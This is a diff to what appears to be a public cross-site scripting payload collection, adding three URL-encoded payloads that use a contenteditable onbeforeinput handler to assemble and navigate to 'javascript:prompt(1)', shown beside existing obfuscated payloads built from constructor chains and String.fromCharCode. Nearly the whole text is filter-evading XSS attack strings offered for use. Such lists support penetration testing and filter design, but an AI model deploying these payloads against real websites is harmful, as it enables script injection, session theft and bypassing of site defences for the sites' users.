@@ -264,6 +264,9 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   <vIdeO><sourCe onerror="['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])">
   <video><source onerror="alert.constructor.constructor('return this')().alert('‏0f')">
   [][`filter`][`constructor`](String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()
+  %22%3E%3Cxss%20contenteditable%20onbeforeinput%3D%22a%3D%27promp%27%3Bf%3D%27t%27%3Bb%3D%27%28%27%3Bc%3D%271%27%3Bd%3D%27%29%27%3Be%3D%27javascript%3A%27%3Blocation%3De%2Ba%2Bf%2Bb%2Bc%2Bd%22%3EGREPSTRING%3C
+%22%3E%3Cxss%20contenteditable%20onbeforeinput=%22a='promp';f='t';b='%26%230000000040';c='1';d='%26%230000000041';e='javascript:';location=e%2Ba%2Bf%2Bb%2Bc%2Bd%22%3EGREPSTRING%3C
+%22%3E%3Cxss%20contenteditable%20onbeforeinput=%22a='promp';f='t';b='(';c='1';d=')';e='javascript:';location=e%2Ba%2Bf%2Bb%2Bc%2Bd%22%3EGREPSTRING%3C
   ```
 </details>
 
